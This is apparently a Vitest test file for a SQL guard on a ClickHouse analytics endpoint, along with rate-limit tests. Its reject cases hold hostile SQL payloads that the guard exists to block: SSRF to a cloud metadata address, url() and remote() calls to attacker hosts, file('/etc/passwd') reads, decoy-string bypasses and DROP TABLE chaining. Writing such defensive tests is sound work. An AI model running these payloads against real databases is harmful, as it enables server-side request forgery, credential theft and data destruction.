import { describe, expect, it } from "vitest";
import { assertSafeSelect } from "@/lib/sql-guard";
import { rateLimit, __resetRateLimits } from "@/lib/rate-limit";

/**
 * The guard is the only thing between the open /api/execute endpoint and the
 * cluster for *arbitrary* (non-grammar-constrained) SQL. Pure, no DB — runs on
 * every `vitest run`. Each reject case is a payload that must NOT reach
 * ClickHouse; each accept case is legitimate analytics SQL that must pass.
 */

describe("assertSafeSelect — accepts legitimate read-only SELECTs", () => {
  const ok = [
    "SELECT count() FROM nyc_taxi",
    "SELECT count() FROM default.nyc_taxi",
    "select avg(fare_amount) from nyc_taxi where passenger_count > 2",
    "SELECT toDate(pickup_datetime) AS d, sum(total_amount) FROM nyc_taxi GROUP BY d ORDER BY d LIMIT 10",
    "SELECT count() FROM nyc_taxi;", // one trailing semicolon is tolerated
  ];
  for (const sql of ok) {
    it(sql.slice(0, 50), () => {
      expect(() => assertSafeSelect(sql)).not.toThrow();
    });
  }

  it("strips a single trailing semicolon from the returned SQL", () => {
    expect(assertSafeSelect("SELECT count() FROM nyc_taxi;")).toBe("SELECT count() FROM nyc_taxi");
  });

  // The geo guard must not over-reject: aliases, arbitrary safe functions, and
  // neighborhood string literals that merely contain the substring all pass.
  const stillOk = [
    "SELECT pickup_ntaname, count() AS trips FROM nyc_taxi GROUP BY pickup_ntaname HAVING trips > 100",
    "SELECT round(avg(fare_amount), 2) FROM nyc_taxi",
    "SELECT count() FROM nyc_taxi WHERE pickup_ntaname = 'Longitude Heights'",
  ];
  for (const sql of stillOk) {
    it(`geo guard allows: ${sql.slice(0, 45)}`, () => {
      expect(() => assertSafeSelect(sql)).not.toThrow();
    });
  }
});

describe("assertSafeSelect — rejects out-of-scope geo (lat/long) columns", () => {
  // lat/long physically exist in nyc_taxi, so unlike a typo'd column they would
  // execute and return data. The grammar's IDENTIFIER fallback accepts them in a
  // predicate / GROUP BY / ORDER BY; this guard is the layer that enforces "no
  // geo in v1" on both the generated and the hand-edited path.
  const blocked = [
    "SELECT count() FROM nyc_taxi WHERE pickup_longitude > -73.9",
    "SELECT count() FROM nyc_taxi WHERE dropoff_latitude IS NOT NULL",
    "SELECT count() FROM nyc_taxi GROUP BY pickup_longitude",
    "SELECT count() FROM nyc_taxi ORDER BY dropoff_longitude",
    "SELECT pickup_latitude FROM nyc_taxi",
  ];
  for (const sql of blocked) {
    it(sql.slice(0, 50), () => {
      expect(() => assertSafeSelect(sql)).toThrow(/geo/i);
    });
  }
});

describe("assertSafeSelect — rejects SSRF / exfiltration table functions", () => {
  // The core regression: ClickHouse `readonly` does not block these read-side
  // table functions, and a decoy `'nyc_taxi'` mention used to satisfy the old
  // substring check. Both must now be rejected.
  const blocked = [
    "SELECT * FROM url('http://169.254.169.254/latest/meta-data/') WHERE 'nyc_taxi' != ''",
    "SELECT * FROM remote('evil:9000', default.nyc_taxi)",
    "SELECT * FROM s3('https://bucket/secret.csv') WHERE 'nyc_taxi' = 'nyc_taxi'",
    "SELECT * FROM nyc_taxi WHERE trip_id IN (SELECT c1 FROM url('http://attacker/x'))",
    "SELECT * FROM file('/etc/passwd') WHERE 'nyc_taxi' != ''",
    "SELECT * FROM mysql('host:3306', 'db', 'secrets', 'u', 'p') WHERE 'nyc_taxi'=''",
  ];
  for (const sql of blocked) {
    it(sql.slice(0, 50), () => {
      expect(() => assertSafeSelect(sql)).toThrow();
    });
  }
});

describe("assertSafeSelect — rejects writes, chaining, comments, and non-SELECTs", () => {
  const blocked: Array<[string, string]> = [
    ["non-SELECT", "DROP TABLE nyc_taxi"],
    ["DML hidden after SELECT", "SELECT 1 FROM nyc_taxi INTO OUTFILE '/tmp/x'"],
    ["statement chaining", "SELECT count() FROM nyc_taxi; DROP TABLE nyc_taxi"],
    ["line comment", "SELECT count() FROM nyc_taxi -- comment"],
    ["block comment", "SELECT count() /* x */ FROM nyc_taxi"],
    ["no nyc_taxi table", "SELECT 1"],
    ["table named only in a string", "SELECT 1 WHERE 'nyc_taxi' = 'nyc_taxi'"],
    ["INSERT", "INSERT INTO nyc_taxi VALUES (1)"],
    ["empty", "   "],
  ];
  for (const [label, sql] of blocked) {
    it(label, () => {
      expect(() => assertSafeSelect(sql)).toThrow();
    });
  }

  it("rejects queries over the length cap", () => {
    const long = `SELECT count() FROM nyc_taxi WHERE pickup_ntaname = '${"a".repeat(4100)}'`;
    expect(() => assertSafeSelect(long)).toThrow(/exceeds/);
  });
});

describe("rateLimit", () => {
  it("allows up to the limit, then blocks within the window", () => {
    __resetRateLimits();
    const opts = { limit: 3, windowMs: 1000 };
    expect(rateLimit("k", opts, 0).ok).toBe(true);
    expect(rateLimit("k", opts, 0).ok).toBe(true);
    expect(rateLimit("k", opts, 0).ok).toBe(true);
    const blocked = rateLimit("k", opts, 0);
    expect(blocked.ok).toBe(false);
    expect(blocked.retryAfterMs).toBe(1000);
  });

  it("resets after the window elapses", () => {
    __resetRateLimits();
    const opts = { limit: 1, windowMs: 1000 };
    expect(rateLimit("k", opts, 0).ok).toBe(true);
    expect(rateLimit("k", opts, 500).ok).toBe(false);
    expect(rateLimit("k", opts, 1000).ok).toBe(true);
  });

  it("tracks distinct keys independently", () => {
    __resetRateLimits();
    const opts = { limit: 1, windowMs: 1000 };
    expect(rateLimit("a", opts, 0).ok).toBe(true);
    expect(rateLimit("b", opts, 0).ok).toBe(true);
    expect(rateLimit("a", opts, 0).ok).toBe(false);
  });
});
